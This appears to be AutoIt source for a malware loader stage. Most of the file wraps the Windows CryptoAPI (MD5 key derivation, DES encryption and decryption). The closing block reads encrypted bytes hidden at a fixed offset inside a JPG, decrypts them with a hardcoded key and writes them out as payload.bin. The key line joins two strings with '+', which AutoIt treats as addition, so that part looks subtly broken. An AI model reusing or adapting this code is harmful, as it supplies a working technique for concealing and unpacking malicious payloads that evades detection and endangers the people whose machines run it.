#include <FileConstants.au3>
#include <String.au3>

Global Const $prov_rsa_full = 1
Global Const $prov_rsa_aes = 24
Global Const $CRYPT_VERIFYCONTEXT = 0xF0000000
Global Const $crypt_exportable = 1
Global Const $crypt_userdata = 1
Global Const $CALG_MD5 = 32771
Global Const $CALG_DES = 0x6601
Global Const $calg_userkey = 4660

Global $handlesArray[3]

Func opentHandles()
	If getNumHandles() = 0 Then
		Local $hAdvapi32 = DllOpen("Advapi32.dll")
		If @error Then Return SetError(1, 0, False)
		setHandleAdvapi($hAdvapi32)
		Local $handleCryptContext
		Local $iproviderid = $prov_rsa_aes
		If @OSVersion = "WIN_2000" Then $iproviderid = $prov_rsa_full
		$handleCryptContext = DllCall(getHandleAdvapi(), "bool", "CryptAcquireContext", "handle*", 0, "ptr", 0, "ptr", 0, "dword", $iproviderid, "dword", $CRYPT_VERIFYCONTEXT)
		If @error OR NOT $handleCryptContext[0] Then
			DllClose(getHandleAdvapi())
			Return SetError(2, 0, False)
		Else
			setHandleCryptContext($handleCryptContext[1])
		EndIf
	EndIf
	incNumHandles()
	Return True
EndFunc

Func cleanupHandles()
	decNumHandles()
	If getNumHandles() = 0 Then
		DllCall(getHandleAdvapi(), "bool", "CryptReleaseContext", "handle", getHandleCryptContext(), "dword", 0)
		DllClose(getHandleAdvapi())
	EndIf
EndFunc

Func genSessionKey($hashKey, $keyAlgId, $algId = $CALG_MD5)
	Local $handleCryptContext
	Local $pHash
	Local $dataBuf
	Local $retCode
	Local $retVal
	opentHandles()
	Do
		$handleCryptContext = DllCall(getHandleAdvapi(), "bool", "CryptCreateHash", "handle", getHandleCryptContext(), "uint", $algId, "ptr", 0, "dword", 0, "handle*", 0)
		If @error OR NOT $handleCryptContext[0] Then
			$retCode = 1
			$retVal = -1
			ExitLoop
		EndIf
		$pHash = $handleCryptContext[5]
		$dataBuf = DllStructCreate("byte[" & BinaryLen($hashKey) & "]")
		DllStructSetData($dataBuf, 1, $hashKey)
		$handleCryptContext = DllCall(getHandleAdvapi(), "bool", "CryptHashData", "handle", $pHash, "struct*", $dataBuf, "dword", DllStructGetSize($dataBuf), "dword", $crypt_userdata)
		If @error OR NOT $handleCryptContext[0] Then
			$retCode = 2
			$retVal = -1
			ExitLoop
		EndIf
		$handleCryptContext = DllCall(getHandleAdvapi(), "bool", "CryptDeriveKey", "handle", getHandleCryptContext(), "uint", $keyAlgId, "handle", $pHash, "dword", $crypt_exportable, "handle*", 0)
		If @error OR NOT $handleCryptContext[0] Then
			$retCode = 3
			$retVal = -1
			ExitLoop
		EndIf
		$retCode = 0
		$retVal = $handleCryptContext[5]
	Until True
	If $pHash <> 0 Then DllCall(getHandleAdvapi(), "bool", "CryptDestroyHash", "handle", $pHash)
	Return SetError($retCode, 0, $retVal)
EndFunc

Func cryptDestroyKey($hcryptkey)
	Local $handleCryptContext = DllCall(getHandleAdvapi(), "bool", "CryptDestroyKey", "handle", $hcryptkey)
	Local $kjlfcljxkf0gdslohsdf = @error
	cleanupHandles()
	If $kjlfcljxkf0gdslohsdf OR NOT $handleCryptContext[0] Then
		Return SetError(1, 0, False)
	Else
		Return SetError(0, 0, True)
	EndIf
EndFunc

Func encryptData($vdata, $vcryptkey, $keyAlgId, $ffinal = True)
	Local $dataBuf
	Local $retCode
	Local $retVal
	Local $reqbuffsize
	Local $handleCryptContext

	opentHandles()

	Do
		If $keyAlgId <> $calg_userkey Then
			$vcryptkey = genSessionKey($vcryptkey, $keyAlgId)
			If @error Then
				$retCode = 1
				$retVal = -1
				ExitLoop
			EndIf
		EndIf

		$handleCryptContext = DllCall(getHandleAdvapi(), "bool", "CryptEncrypt", "handle", $vcryptkey, "handle", 0, "bool", $ffinal, "dword", 0, "ptr", 0, "dword*", BinaryLen($vdata), "dword", 0)
		If @error OR NOT $handleCryptContext[0] Then
			$retCode = 2
			$retVal = -1
			ExitLoop
		EndIf

		$reqbuffsize = $handleCryptContext[6]
		$dataBuf = DllStructCreate("byte[" & $reqbuffsize & "]")
		DllStructSetData($dataBuf, 1, $vdata)
		$handleCryptContext = DllCall(getHandleAdvapi(), "bool", "CryptEncrypt", "handle", $vcryptkey, "handle", 0, "bool", $ffinal, "dword", 0, "struct*", $dataBuf, "dword*", BinaryLen($vdata), "dword", DllStructGetSize($dataBuf))
		If @error OR NOT $handleCryptContext[0] Then
			$retCode = 3
			$retVal = -1
			ExitLoop
		EndIf
		$retCode = 0
		$retVal = DllStructGetData($dataBuf, 1)
	Until True

	If $keyAlgId <> $calg_userkey Then cryptDestroyKey($vcryptkey)
	cleanupHandles()

	Return SetError($retCode, 0, $retVal)
EndFunc

Func decryptData($vdata, $vcryptkey, $keyAlgId, $ffinal = True)
	Local $dataBuf
	Local $retCode
	Local $retVal
	Local $htempstruct
	Local $iplaintextsize
	Local $handleCryptContext

	opentHandles()

	Do
		If $keyAlgId <> $calg_userkey Then
			$vcryptkey = genSessionKey($vcryptkey, $keyAlgId)
			If @error Then
				$retCode = 1
				$retVal = -1
				ExitLoop
			EndIf
		EndIf
		$dataBuf = DllStructCreate("byte[" & BinaryLen($vdata) + 1000 & "]")
		DllStructSetData($dataBuf, 1, $vdata)
		$handleCryptContext = DllCall(getHandleAdvapi(), "bool", "CryptDecrypt", "handle", $vcryptkey, "handle", 0, "bool", $ffinal, "dword", 0, "struct*", $dataBuf, "dword*", BinaryLen($vdata))

		If @error OR NOT $handleCryptContext[0] Then
			$retCode = 2
			$retVal = -1
			ExitLoop
		EndIf
		$iplaintextsize = $handleCryptContext[6]
		$htempstruct = DllStructCreate("byte[" & $iplaintextsize & "]", DllStructGetPtr($dataBuf))
		$retCode = 0
		$retVal = DllStructGetData($htempstruct, 1)
	Until True
	If $keyAlgId <> $calg_userkey Then cryptDestroyKey($vcryptkey)
	cleanupHandles()
	Return SetError($retCode, 0, $retVal)
EndFunc

Func getNumHandles()
	Return $handlesArray[0]
EndFunc

Func incNumHandles()
	$handlesArray[0] += 1
EndFunc

Func decNumHandles()
	If $handlesArray[0] > 0 Then $handlesArray[0] -= 1
EndFunc

Func getHandleAdvapi()
	Return $handlesArray[1]
EndFunc

Func setHandleAdvapi($hAdvapi32)
	$handlesArray[1] = $hAdvapi32
EndFunc

Func getHandleCryptContext()
	Return $handlesArray[2]
EndFunc

Func setHandleCryptContext($hcryptcontext)
	$handlesArray[2] = $hcryptcontext
EndFunc

; Extract and decrypt payload
$decKey = "910a50c5b3b2756e" + "ABRACADABRA"
Local $hFile = FileOpen("img246680.713817478.jpg", $FO_READ + $FO_BINARY)
FileSetPos($hFile, 777835, 0)
$encData = FileRead($hFile)
$decData = decryptdata($encData, $decKey, $CALG_DES)
Local $hOutFile = FileOpen("payload.bin", $FO_OVERWRITE + $FO_BINARY)
FileWrite($hOutFile, $decData)